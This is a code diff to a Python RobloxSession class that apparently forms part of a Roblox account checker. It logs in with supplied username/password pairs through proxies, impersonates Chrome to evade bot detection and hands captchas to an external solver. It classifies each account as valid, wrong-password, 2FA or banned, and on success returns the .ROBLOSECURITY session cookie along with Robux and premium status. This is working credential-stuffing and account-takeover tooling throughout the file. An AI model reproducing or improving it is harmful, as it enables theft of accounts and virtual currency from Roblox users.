@@ -1,17 +1,38 @@
-import requests
 import json
 import time
 import random
 from urllib.parse import urlparse
 
+# Try curl_cffi first (better for Roblox), fallback to requests
+try:
+    from curl_cffi import requests as cffi_requests
+    HAS_CFFI = True
+except ImportError:
+    HAS_CFFI = False
+    import requests as cffi_requests
+    print("[!] Install curl_cffi for better accuracy: pip install curl_cffi")
+
 # Import utilities
 from util import get_proxy_url, random_user_agent, parse_proxy
 
+
 class RobloxSession:
+    """Roblox session with browser impersonation for high accuracy."""
+    
     def __init__(self, proxy=None):
-        self.session = requests.Session()
+        # Create session with browser impersonation
+        if HAS_CFFI:
+            self._session = cffi_requests.Session(impersonate="chrome131")
+        else:
+            self._session = cffi_requests.Session()
+        
         self.proxy_dict = None
         self.proxy_url = None
+        self._impersonate = "chrome131" if HAS_CFFI else None
+        
+        # Expose session attributes directly for compatibility
+        self.headers = self._session.headers
+        self.cookies = self._session.cookies
         
         # Setup Proxy
         if proxy:
@@ -22,308 +43,209 @@ class RobloxSession:
                 self.proxy_dict = proxy
                 self.proxy_url = get_proxy_url(proxy)
                 # Configure requests session
-                self.session.proxies = {
+                self._session.proxies = {
                     "http": self.proxy_url,
                     "https": self.proxy_url
                 }
         
-        # Setup Headers
-        self.session.headers.update({
-            "User-Agent": random_user_agent(),
+        # Setup Headers (Chrome 131)
+        self._session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
             "Accept": "application/json, text/plain, */*",
             "Accept-Language": "en-US,en;q=0.9",
             "Accept-Encoding": "gzip, deflate, br",
             "Connection": "keep-alive",
             "Origin": "https://www.roblox.com",
-            "Referer": "https://www.roblox.com/"
+            "Referer": "https://www.roblox.com/",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "same-site",
+            "sec-ch-ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A.Brand";v="24"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
         })
         
         self.csrf_token = None
         self.auth_ticket = None
         self.user_id = None
         self.username = None
+        self.password = None  # Store password for captcha solver
         self.is_logged_in = False
         self.needs_captcha = False
         self.captcha_blob = None
-        self.captcha_site_key = "476068BF-9607-4799-B53D-966BE98E2B81" # Standard Roblox Arkose Key
+        self.captcha_site_key = "476068BF-9607-4799-B53D-966BE98E2B81"
+    
+    # Proxy methods for HTTP requests (for compatibility with roblox.py)
+    def get(self, url, **kwargs):
+        """Make a GET request."""
+        return self._session.get(url, **kwargs)
+    
+    def post(self, url, **kwargs):
+        """Make a POST request."""
+        return self._session.post(url, **kwargs)
+    
+    def put(self, url, **kwargs):
+        """Make a PUT request."""
+        return self._session.put(url, **kwargs)
+    
+    def delete(self, url, **kwargs):
+        """Make a DELETE request."""
+        return self._session.delete(url, **kwargs)
 
-    def _get_csrf(self):
-        """Fetches a fresh CSRF token from Roblox."""
-        try:
-            # Primary method: Get from auth metadata endpoint
-            resp = self.session.get("https://auth.roblox.com/v2/captcha-metadata", timeout=10)
-            token = resp.headers.get('x-csrf-token')
-            if token and len(token) > 10:
-                self.csrf_token = token
-                return True
-            
-            # Fallback: Try the login page
-            resp = self.session.get("https://www.roblox.com/login", timeout=10)
-            token = resp.headers.get('x-csrf-token')
-            if token and len(token) > 10:
-                self.csrf_token = token
-                return True
-                
-            # Last resort: Try POST to trigger CSRF header
-            resp = self.session.post("https://auth.roblox.com/v2/login", json={})
-            token = resp.headers.get('x-csrf-token')
-            if token and len(token) > 10:
-                self.csrf_token = token
-                return True
-                
-            return False
-        except Exception as e:
-            # print(f"[!] CSRF Error: {e}")
-            return False
-
-    def login(self, username, password):
-        """Attempts to log in to Roblox with improved API handling."""
-        try:
-            # 1. Get CSRF Token with multiple fallbacks
-            if not self._get_csrf():
-                time.sleep(1)
-                if not self._get_csrf():
-                    return False
-
-            # 2. Prepare Login Payload - Roblox expects specific format
-            login_data = {
-                "ctype": "username",
-                "cvalue": username,
-                "password": password
-            }
-            
-            headers = {
-                "Content-Type": "application/json",
-                "x-csrf-token": self.csrf_token,
-                "Referer": "https://www.roblox.com/login"
-            }
-
-            # 3. Send Login Request with proper timeout
-            resp = self.session.post(
-                "https://auth.roblox.com/v2/login",
-                json=login_data,
-                headers=headers,
-                timeout=15
-            )
-            
-            data = resp.json()
-            
-            # 4. Handle Responses
-            if resp.status_code == 200:
-                if data.get("user"):
-                    self.is_logged_in = True
-                    self.username = data["user"]["userName"]
-                    self.user_id = data["user"]["id"]
-                    
-                    # Set Auth Cookie if present
-                    if ".ROBLOSECURITY" in resp.cookies:
-                        self.session.cookies.set(".ROBLOSECURITY", resp.cookies[".ROBLOSECURITY"])
-                    
+    def _get_csrf(self, max_retries=2):
+        """Fetches a fresh CSRF token from Roblox with multiple endpoint fallbacks."""
+        attempt = 0
+        while attempt < max_retries:
+            try:
+                # Method 1: Get from auth metadata endpoint
+                resp = self._session.get("https://auth.roblox.com/v2/captcha-metadata", timeout=10)
+                token = resp.headers.get('x-csrf-token')
+                if token and len(token) > 10:
+                    self.csrf_token = token
                     return True
-                else:
-                    return False
-                    
-            elif resp.status_code == 401:
-                # Check for Captcha requirement or invalid credentials
-                errors = data.get("errors", [])
-                for err in errors:
-                    code = err.get("code")
-                    message = err.get("message", "")
-                    
-                    # Captcha required - check both string and numeric codes
-                    if code == "CaptchaRequired" or (isinstance(code, int) and code in [10, 13]):
-                        self.needs_captcha = True
-                        # Extract blob if available in response
-                        self.captcha_blob = err.get("context", {}).get("captchaBlob") or err.get("message")
-                        return False  # Needs captcha solve
-                    
-                    # Invalid password or credentials
-                    if code == "InvalidPassword" or code == "InvalidCredentials" or (isinstance(code, int) and code in [1, 2]):
-                        return False
-                    
-                    # Account locked or banned
-                    if code == "AccountLocked" or code == "AccountBanned" or (isinstance(code, int) and code in [4, 5]):
-                        return False
-                    
-                    # Rate limited - might indicate captcha needed
-                    if code == "RateLimited" or (isinstance(code, int) and code == 8):
-                        self.needs_captcha = True
-                        return False
-                        
-                # Default to invalid for unknown 401 errors
-                return False
                 
-            elif resp.status_code == 403:
-                # Often means captcha required immediately
-                errors = data.get("errors", [])
-                for err in errors:
-                    code = err.get("code")
-                    if code == "CaptchaRequired" or (isinstance(code, int) and code in [10, 13]):
-                        self.needs_captcha = True
-                        self.captcha_blob = err.get("context", {}).get("captchaBlob")
-                        return False
+                # Method 2: Try POST to /v2/login with empty body
+                resp = self._session.post("https://auth.roblox.com/v2/login", json={}, timeout=10)
+                token = resp.headers.get('x-csrf-token')
+                if token and len(token) > 10:
+                    self.csrf_token = token
+                    return True
                 
-                # If we get 403 without explicit captcha code, it might still be a captcha challenge
-                self.needs_captcha = True
-                return False
-                
-            elif resp.status_code == 429:
-                # Rate limited - often indicates need for captcha or proxy issue
-                self.needs_captcha = True
-                return False
-                
-            else:
-                return False
+                # Method 3: Try signup page
+                resp = self._session.get("https://www.roblox.com/signup", timeout=10)
+                token = resp.headers.get('x-csrf-token')
+                if token and len(token) > 10:
+                    self.csrf_token = token
+                    return True
+                    
+            except Exception as e:
+                pass
+            
+            attempt += 1
+            if attempt < max_retries:
+                time.sleep(0.5)
+        
+        return False
 
-        except requests.exceptions.ProxyError:
+    def get_initial_cookies(self):
+        """Visit Roblox homepage to get initial cookies."""
+        try:
+            resp = self._session.get("https://www.roblox.com/", timeout=10)
+            return resp.status_code == 200
+        except:
             return False
-        except requests.exceptions.Timeout:
+
+    def get_csrf_token(self):
+        """Get X-CSRF token from Roblox - Simple API method"""
+        url = "https://auth.roblox.com/v1/login"
+        try:
+            response = self._session.post(url, timeout=30)
+            if 'x-csrf-token' in response.headers:
+                self.csrf_token = response.headers['x-csrf-token']
+                self._session.headers["x-csrf-token"] = self.csrf_token
+                return True
             return False
         except Exception as e:
+            print(f"[-] Error getting CSRF token: {str(e)}")
             return False
 
-    def solve_captcha_and_retry(self, solver_func, password=None):
+    def login(self, username: str, password: str, sai: str = None) -> dict:
         """
-        Calls the external solver, updates session, and retries login.
-        solver_func: A function that takes (site_key, url, blob) and returns token.
-        password: The user's password for retrying login after captcha solve.
+        Simple API Login - Based on working checker.
+        Only switches to browser when captcha is detected.
         """
-        if not self.needs_captcha:
-            # No captcha needed, just try login directly
-            if password and self.username:
-                print(f"   [*] No captcha required, attempting direct login...")
-                return self._do_login_request(password)
-            return False
-            
-        print(f"   ⚡ Solving Captcha for {self.username}...")
+        # Store credentials for captcha solver
+        self.username = username
+        self.password = password
+        
+        # Get CSRF token first
+        if not self.csrf_token:
+            if not self.get_csrf_token():
+                return {"success": False, "error": "Failed to get CSRF token"}
+        
+        # Build payload - simple format like reference
+        payload = {
+            "ctype": "Username",
+            "cvalue": username,
+            "password": password
+        }
+        
+        if sai:
+            payload["secureAuthenticationIntent"] = sai
         
         try:
-            # Call the solver (passed from main)
-            result = solver_func(self.captcha_site_key, "https://www.roblox.com/login", self.captcha_blob)
+            resp = self._session.post("https://auth.roblox.com/v1/login", json=payload, timeout=30)
+            data = resp.json() if resp.text else {}
             
-            # Handle both dict and string results
-            token = None
-            visual_success = False
-            
-            if isinstance(result, dict):
-                token = result.get('token')
-                visual_success = result.get('success', False) or token in ['VISUAL_SUCCESS', 'NO_CHALLENGE']
-            else:
-                token = result
-                visual_success = token in ['VISUAL_SUCCESS', 'NO_CHALLENGE'] or (token and len(token) > 20)
-            
-            if not token and not visual_success:
-                print(f"   ❌ Solver failed for {self.username}")
-                return False
-            
-            if token == "NO_CHALLENGE":
-                print(f"   ✅ No captcha required, retrying login...")
-            elif token == "VISUAL_SUCCESS" or visual_success:
-                print(f"   ✅ Captcha visually solved! Retrying login...")
-            elif token:
-                print(f"   ✅ Captcha Solved! Token: {token[:20]}...")
-                self.session.headers["x-captcha-token"] = token
-            
-            # Reset captcha flag
-            self.needs_captcha = False
-            
-            # Retry login if password is provided
-            if password:
-                print(f"   🔄 Retrying login for {self.username}...")
-                
-                # Re-get CSRF token
-                self._get_csrf()
-                
-                login_data = {
-                    "ctype": "username",
-                    "cvalue": self.username,
-                    "password": password
-                }
-                
-                headers = {
-                    "Content-Type": "application/json",
-                    "x-csrf-token": self.csrf_token,
-                    "Referer": "https://www.roblox.com/login"
-                }
-                
-                # Add captcha token if we have one
-                if hasattr(self, 'session') and 'x-captcha-token' in self.session.headers:
-                    headers["x-captcha-token"] = self.session.headers['x-captcha-token']
-                
-                resp = self.session.post(
-                    "https://auth.roblox.com/v2/login",
-                    json=login_data,
-                    headers=headers,
-                    timeout=15
-                )
-                
-                data = resp.json() if resp.text else {}
-                
-                if resp.status_code == 200 and data.get("user"):
-                    self.is_logged_in = True
-                    self.user_id = data["user"]["id"]
+            # Check for errors first (like reference code)
+            if "errors" in data:
+                for error in data["errors"]:
+                    code = error.get("code", -1)
+                    message = error.get("message", "")
                     
-                    if ".ROBLOSECURITY" in resp.cookies:
-                        self.session.cookies.set(".ROBLOSECURITY", resp.cookies[".ROBLOSECURITY"])
+                    # Code 1 = Incorrect password
+                    if code == 1:
+                        return {"success": False, "error": "incorrect", "message": message}
                     
-                    print(f"   ✅ Login successful after captcha solve!")
-                    return True
-                else:
-                    # Check if we got another captcha
-                    errors = data.get("errors", [])
-                    for err in errors:
-                        code = err.get("code")
-                        msg = err.get("message", "")
-                        
-                        # Captcha required again
-                        if code == 10 or code == "CaptchaRequired" or "Captcha" in msg:
-                            print(f"   [yellow]Another captcha required - solver may have failed[/yellow]")
+                    # Code 2 = Captcha required - switch to browser
+                    elif code == 2:
+                        self.needs_captcha = True
+                        return {"success": False, "needs_captcha": True, "message": "Captcha required"}
+                    
+                    # Code 0 = Challenge/Captcha
+                    elif code == 0:
+                        if "Challenge" in message or "challenge" in message.lower():
                             self.needs_captcha = True
-                            return False
-                        
-                        # Invalid credentials - account is actually bad
-                        if code == 4 or "Incorrect" in msg or "Invalid" in msg:
-                            print(f"   [red]Invalid credentials confirmed (captcha was real but account is bad)[/red]")
-                            return False
-                        
-                        # Account locked/banned
-                        if code == 13 or code == 8 or "Locked" in msg or "Banned" in msg:
-                            print(f"   [red]Account locked or banned[/red]")
-                            return False
+                            return {"success": False, "needs_captcha": True, "message": message}
+                        elif "users" in error.get("fieldData", ""):
+                            # Multi-factor - need to select user
+                            return {"success": False, "multi_factor": True, "fieldData": error.get("fieldData")}
                     
-                    # If no specific error but still failed, try one more time with fresh CSRF
-                    print(f"   [yellow]Login failed, trying once more with fresh token...[/yellow]")
-                    time.sleep(1)
-                    self._get_csrf()
-                    headers["x-csrf-token"] = self.csrf_token
+                    # Other error codes
+                    elif code in [17, 23, 24]:
+                        return {"success": False, "needs_2fa": True, "message": message}
                     
-                    resp2 = self.session.post(
-                        "https://auth.roblox.com/v2/login",
-                        json=login_data,
-                        headers=headers,
-                        timeout=15
-                    )
-                    
-                    data2 = resp2.json() if resp2.text else {}
-                    
-                    if resp2.status_code == 200 and data2.get("user"):
-                        self.is_logged_in = True
-                        self.user_id = data2["user"]["id"]
-                        if ".ROBLOSECURITY" in resp2.cookies:
-                            self.session.cookies.set(".ROBLOSECURITY", resp2.cookies[".ROBLOSECURITY"])
-                        print(f"   [green]Login successful on retry![/green]")
-                        return True
-                    
-                    # Final failure
-                    print(f"   [red]Login retry failed - account likely invalid[/red]")
-                    return False
-                    
+                    else:
+                        return {"success": False, "error": "unknown", "message": message}
+            
+            # Success - user logged in
+            if "user" in data:
+                user_data = data["user"]
+                self.is_logged_in = True
+                self.user_id = user_data.get("id")
+                self.username = user_data.get("name", username)
+                
+                # Get the cookie
+                cookie = self._session.cookies.get(".ROBLOSECURITY", "")
+                
+                return {
+                    "success": True,
+                    "user_id": self.user_id,
+                    "username": self.username,
+                    "display_name": user_data.get("displayName", ""),
+                    "is_banned": user_data.get("isBanned", False),
+                    "cookie": cookie
+                }
+            
+            # Check for challenge ID (captcha)
+            if "challengeId" in data:
+                self.needs_captcha = True
+                self.captcha_blob = data.get("challengeMetadata", "{}")
+                return {
+                    "success": False, 
+                    "needs_captcha": True, 
+                    "challenge_id": data["challengeId"],
+                    "challenge_metadata": self.captcha_blob
+                }
+            
+            # 2FA
+            if "twoStepVerification" in data:
+                return {"success": False, "needs_2fa": True}
+            
+            return {"success": False, "error": "unknown", "message": "Unknown response"}
+            
         except Exception as e:
-            print(f"   [red]Captcha solve error: {e}[/red]")
-            return False
-        
-        # No password provided, just indicate captcha was solved
-        return True
+            return {"success": False, "error": "exception", "message": str(e)}
 
     def get_account_info(self):
         """Fetches Robux and other details for the logged-in user."""
@@ -331,8 +253,8 @@ class RobloxSession:
             return {"error": "Not logged in", "robux": 0, "premium": False}
         
         try:
-            # 1. Get Robux Balance
-            robux_resp = self.session.get(
+            # Get Robux Balance
+            robux_resp = self._session.get(
                 f"https://economy.roblox.com/v1/users/{self.user_id}/currency",
                 timeout=15
             )
@@ -342,10 +264,10 @@ class RobloxSession:
             else:
                 robux = 0
             
-            # 2. Get Premium Status
+            # Get Premium Status
             is_premium = False
             try:
-                premium_resp = self.session.get(
+                premium_resp = self._session.get(
                     f"https://premiumfeatures.roblox.com/v1/users/{self.user_id}/validate-membership",
                     timeout=15
                 )
@@ -354,9 +276,9 @@ class RobloxSession:
             except:
                 pass
             
-            # 3. Get Additional Info (optional)
+            # Get Additional Info
             try:
-                info_resp = self.session.get(
+                info_resp = self._session.get(
                     f"https://users.roblox.com/v1/users/{self.user_id}",
                     timeout=15
                 )
@@ -381,8 +303,19 @@ class RobloxSession:
 
     def set_captcha_token(self, token):
         """Helper to manually set captcha token if solved externally."""
-        self.session.headers["x-captcha-token"] = token
+        self._session.headers["x-captcha-token"] = token
         self.needs_captcha = False
+
 
 # Alias for backwards compatibility with roblox.py
 Session = RobloxSession
+
+
+# Static method for random session creation (used by roblox.py)
+def random_session():
+    """Create a new session without proxy."""
+    return RobloxSession(proxy=None)
+
+
+# Add as class method
+RobloxSession.random_session = staticmethod(random_session)
